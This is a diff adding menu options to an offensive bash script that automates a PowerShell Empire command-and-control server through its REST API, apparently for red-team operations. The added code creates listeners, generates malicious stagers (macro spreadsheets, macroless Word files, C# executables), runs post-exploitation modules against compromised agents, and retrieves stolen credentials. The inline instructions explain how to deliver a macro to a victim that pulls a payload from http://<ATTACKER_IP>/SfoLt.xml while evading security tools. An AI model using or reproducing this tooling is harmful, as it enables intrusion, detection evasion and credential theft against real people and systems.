@@ -983,10 +983,129 @@ do
 	cd ~/Empire && python empire --rest --username empireadmin --password Password123
 	cd ..
 	        ;;
-        "Step 2 - Launch DeathStar")
+        "Step 2 - Launch DeathStar (Optional)")
     echo -e "\E[1;34m::::: \e[97mLaunching DeathStar \E[1;34m:::::"
     python3 ~/DeathStar/DeathStar.py
     	    ;;
+    	"Step 3 - Acquire PSE REST API Permanent Token")
+    outputfile=PSE_perm_token.txt
+    read -p 'Set PSE C2 (LHOST): ' userlistener; read -p 'Set PSE C2 API Port (API_LPORT): ' userport; read -p 'Set PSE C2 Token (API Auth): ' usertoken;
+    	curl --insecure -i https://$userlistener:$userport/api/admin/permanenttoken?token=$usertoken | tee ~/ATAT/PSE_perm_token_pre.txt
+    	cat ~/ATAT/PSE_perm_token_pre.txt | egrep -o '([a-zA-Z0-9]{40})' > $outputfile
+    	rm ~/ATAT/PSE_perm_token_pre.txt
+			;;
+		"Start PSE Listener")
+    pseauthtoken=~/ATAT/PSE_perm_token.txt
+    read -p 'Set PSE C2 (LHOST): ' userlistener; read -p 'Set PSE C2 API Port (API_LPORT): ' userport; read -p 'Set PSE Listener Name: ' userlname;
+		curl --insecure -i -H "Content-Type: application/json" https://$userlistener:$userport/api/listeners/http?token=$(cat $pseauthtoken) -X POST -d '{"Name":"$userlname"}'
+            echo -e "\E[1;34m::::: \e[97mPSE Listener Has Been Created \E[1;34m:::::"
+			;;
+		"Get PSE Stagers")
+    pseauthtoken=~/ATAT/PSE_perm_token.txt
+    read -p 'Set PSE C2 (LHOST): ' userlistener; read -p 'Set PSE C2 API Port (API_LPORT): ' userport; 
+		curl --insecure -i https://$userlistener:$userport/api/stagers?token=$(cat $pseauthtoken) | tee ~/ATAT/PSE_stagers_pre.txt
+		sed "/}}},{\"Author/s/}}},{\"Author/\"}}}, \r\n{\"Author\"/g" ~/ATAT/PSE_stagers_pre.txt > ~/ATAT/PSE_stagers.txt
+		rm ~/ATAT/PSE_stagers_pre.txt	
+            echo -e "\E[1;34m::::: \e[97mStagers have been saved to ~/ATAT/PSE_stagers.txt \E[1;34m:::::"
+			;;
+		"Get PSE Agents")
+    pseauthtoken=~/ATAT/PSE_perm_token.txt
+    read -p 'Set PSE C2 (LHOST): ' userlistener; read -p 'Set PSE C2 API Port (API_LPORT): ' userport; 
+		curl --insecure -i https://$userlistener:$userport/api/agents?token=$(cat $pseauthtoken) | tee ~/ATAT/PSE_agents_pre.txt	
+            echo -e "\E[1;34m::::: \e[97mAgents have been saved to ~/ATAT/PSE_agents.txt \E[1;34m:::::"
+			;;
+		"Rename PSE Agent")
+    pseauthtoken=~/ATAT/PSE_perm_token.txt
+    read -p 'Set PSE C2 (LHOST): ' userlistener; read -p 'Set PSE C2 API Port (API_LPORT): ' userport; read -p 'Set PSE Agent Name (Current): ' agentname; read -p 'Set New Name for PSE Agent: ' useragentname; 
+		curl --insecure -i -H "Content-Type: application/json" https://$userlistener:$userport/api/agents/$agentname/rename?token=$(cat $pseauthtoken) -X POST -d '{"newname":'\"$useragentname\"'}'
+            echo -e "\E[1;34m::::: \e[97mAgents have been saved to ~/ATAT/PSE_agents.txt \E[1;34m:::::"
+			;;
+		"Generate PSE Stagers - Windows (mostly)")
+	pseauthtoken=~/ATAT/PSE_perm_token.txt
+    outputfile=~/ATAT/PSE_stager_launcher.txt
+    read -p 'Set PSE C2 (LHOST): ' userlistener; read -p 'Set PSE C2 API Port (API_LPORT): ' userport; read -p 'Set PSE listener name (http, DeathStar, etc.): ' userlistenername; read -p 'Select 1 of the following PSE Stagers ONLY (windows/backdoorLnkMacro, windows/teensy, windows/macro, windows/launcher_xml, windows/launcher_vbs, windows/launcher_sct, windows/launcher_bat, multi/macro): ' userstager;
+		curl --insecure -i -H "Content-Type: application/json" https://$userlistener:$userport/api/stagers?token=$(cat $pseauthtoken) -X POST -d '{"StagerName":'\"$userstager\"', "Listener":'\"$userlistenername\"'}' | grep -Po '"Output":.*?[^\\]",' | sed 's/^.\{10\}//' | sed '$s/..$//' | tee ~/ATAT/PSE_stager_launcher_pre.txt
+		cat ~/ATAT/PSE_stager_launcher_pre.txt | base64 --decode > $outputfile
+		rm ~/ATAT/PSE_stager_launcher_pre.txt
+            echo -e "\E[1;34m::::: \e[97mStager output has been saved to ~/ATAT/PSE_stager_launcher.txt \E[1;34m:::::"
+            echo -e "\E[1;34m::::: \e[97mSpecial Instructions for ""windows/backdoorLnkMacro"" - XLS macro (to be delivered to & run on vitcim machine) written to /tmp/default.xls  
+            Remember to add macro code from default.xls to any other XLS prior to use on victim. 
+            XML code that is called by the XLS macro has been written to /var/www/html/SfoLt.xml & ~/ATAT/PSE_stager_launcher.txt (for backup text copy)
+            This XML file must be accessible by the target at this url: http://<ATTACKER_IP>/SfoLt.xml 
+            The XLS macro (once run) will download the PSE powershell stager from within the XML code. 
+            This is done to defeat application-aware security measures that flag on launches of powershell from unexpected programs, such as a direct launch from office applications. As the macro is pure vba and does not leverage powershell it is less likely to be detected by these types of tools.\E[1;34m:::::"
+			;;
+		"Generate PSE Stagers - Windows/OSX/Linux")
+	pseauthtoken=~/ATAT/PSE_perm_token.txt
+    outputfile=~/ATAT/PSE_stager_launcher_multi.txt
+    read -p 'Set PSE C2 (LHOST): ' userlistener; read -p 'Set PSE C2 API Port (API_LPORT): ' userport; read -p 'Set PSE listener name (http, DeathStar, etc.): ' userlistenername; read -p 'Select 1 of the following PSE Stagers ONLY (windows/hta, windows/ducky, windows/bunny, osx/teensy, osx/safari_launcher, osx/macro, osx/launcher, osx/ducky, osx/applescript, multi/launcher, multi/bash ): ' userstager;
+		curl --insecure -i -H "Content-Type: application/json" https://$userlistener:$userport/api/stagers?token=$(cat $pseauthtoken) -X POST -d '{"StagerName":'\"$userstager\"', "Listener":'\"$userlistenername\"'}' | grep -Po '"Output":.*?[^\\]",' | sed 's/^.\{10\}//' | sed '$s/..$//' | tee $outputfile
+            echo -e "\E[1;34m::::: \e[97mStager output has been saved to ~/ATAT/PSE_stager_launcher_multi.txt \E[1;34m:::::"
+			;;
+		"Generate PSE Stagers - MSWord File & CSharp Payload")
+	pseauthtoken=~/ATAT/PSE_perm_token.txt
+    outputfile=~/ATAT/PSE_stager_launcher_file.txt
+    read -p 'Set PSE C2 (LHOST): ' userlistener; read -p 'Set PSE C2 API Port (API_LPORT): ' userport; read -p 'Set PSE listener name (http, DeathStar, etc.): ' userlistenername; read -p 'Select 1 of the following PSE Stagers ONLY (windows/macroless_msword, windows/csharp_exe): ' userstager;
+		curl --insecure -i -H "Content-Type: application/json" https://$userlistener:$userport/api/stagers?token=$(cat $pseauthtoken) -X POST -d '{"StagerName":'\"$userstager\"', "Listener":'\"$userlistenername\"'}' | grep -Po '"Output":.*?[^\\]",' | sed 's/^.\{10\}//' | sed '$s/..$//' | tee $outputfile
+            echo -e "\E[1;34m::::: \e[97mStager output has been saved to ~/ATAT/PSE_stager_launcher_file.txt \E[1;34m:::::"
+            echo -e "\E[1;34m::::: \e[97mSpecial Instructions for ""windows/macroless_msword""
+            'empire.docx' and 'default.ps1' was created in the '/tmp/' directory \E[1;34m:::::"
+            echo ""
+            echo -e "\E[1;34m::::: \e[97mSpecial Instructions for ""windows/csharp_exe""
+            launcher.src.zip created in the '/tmp/' directory \E[1;34m:::::"
+			;;
+    	"Windows Post-Exploitation")
+    inputfile=~/ATAT/PSE_windows_postex.txt
+	pseauthtoken=~/ATAT/PSE_perm_token.txt
+    read -p 'Set PSE C2 (LHOST): ' userlistener; read -p 'Set PSE C2 API Port (API_LPORT): ' userport; read -p 'Set PSE Agent: ' useragent;
+	for MODULE in $(cat $inputfile)
+	do
+	curl --insecure -i -H "Content-Type: application/json" https://$userlistener:$userport/api/modules/$MODULE?token=$(cat $pseauthtoken) -X POST -d '{"Agent":'\"$useragent\"'}' >> ~/ATAT/Windows_PSE_postex.log
+	sleep 90
+	done
+            echo -e "\E[1;34m::::: \e[97mxXx Powershell Agent Has Been Pillaged xXx\E[1;34m:::::"
+			;;	
+		"Linux/OSX Post-Exploitation")
+    inputfile=~/ATAT/PSE_linux_osx_postex.txt
+	pseauthtoken=~/ATAT/PSE_perm_token.txt
+    read -p 'Set PSE C2 (LHOST): ' userlistener; read -p 'Set PSE C2 API Port (API_LPORT): ' userport; read -p 'Set PSE Agent: ' useragent;
+	for MODULE in $(cat $inputfile)
+	do
+	curl --insecure -i -H "Content-Type: application/json" https://$userlistener:$userport/api/modules/$MODULE?token=$(cat $pseauthtoken) -X POST -d '{"Agent":'\"$useragent\"'}' >> ~/ATAT/Linux_OSX_PSE_postex.log
+	sleep 90
+	done
+            echo -e "\E[1;34m::::: \e[97mxXx Powershell Agent Has Been Pillaged xXx\E[1;34m:::::"
+			;;
+		"Get PSE Stored Credentials")
+    pseauthtoken=~/ATAT/PSE_perm_token.txt
+    read -p 'Set PSE C2 (LHOST): ' userlistener; read -p 'Set PSE C2 API Port (API_LPORT): ' userport; 
+	curl --insecure -i https://$userlistener:$userport/api/creds?token=$(cat $pseauthtoken) | tee ~/ATAT/PSE_creds.txt	
+            echo -e "\E[1;34m::::: \e[97mAgents have been saved to ~/ATAT/PSE_creds.txt \E[1;34m:::::"
+			;;
+		"Kill PSE Listener")
+    pseauthtoken=~/ATAT/PSE_perm_token.txt
+    read -p 'Set PSE C2 (LHOST): ' userlistener; read -p 'Set PSE C2 API Port (API_LPORT): ' userport; read -p 'Listener to Kill): ' userlistener; 
+	curl --insecure -i https://$userlistener:$userport/api/listeners/$userlistener?token=$(cat $pseauthtoken) -X DELETE	
+            echo -e "\E[1;34m::::: \e[97m$userlistener Has Been Killed \E[1;34m:::::"
+			;;
+		"Kill All PSE Listeners")
+	pseauthtoken=~/ATAT/PSE_perm_token.txt
+    read -p 'Set PSE C2 (LHOST): ' userlistener; read -p 'Set PSE C2 API Port (API_LPORT): ' userport;
+	curl --insecure -i https://$userlistener:$userport/api/listeners/all?token=$(cat $pseauthtoken) -X DELETE	
+            echo -e "\E[1;34m::::: \e[97mAll PSE Listeners Have Been Killed \E[1;34m:::::"
+			;;
+		"Restart PSE RESTful API")
+	pseauthtoken=~/ATAT/PSE_perm_token.txt
+    read -p 'Set PSE C2 (LHOST): ' userlistener; read -p 'Set PSE C2 API Port (API_LPORT): ' userport;	
+	curl --insecure -i https://$userlistener:$userport/api/admin/restart?token=$(cat $pseauthtoken)
+		echo -e "\E[1;34m::::: \e[97mPSE RESTful API Has Been Restarted \E[1;34m:::::"
+			;;
+		"Shutdown PSE RESTful API")
+	pseauthtoken=~/ATAT/PSE_perm_token.txt
+    read -p 'Set PSE C2 (LHOST): ' userlistener; read -p 'Set PSE C2 API Port (API_LPORT): ' userport;	
+    curl --insecure -i https://$userlistener:$userport/api/admin/shutdown?token=$(cat $pseauthtoken)
+		echo -e "\E[1;34m::::: \e[97mPSE RESTful API Has Been Shutdown \E[1;34m:::::"
+			;;
         "Main Menu")
            ~/ATAT/ATAT.sh
             ;;
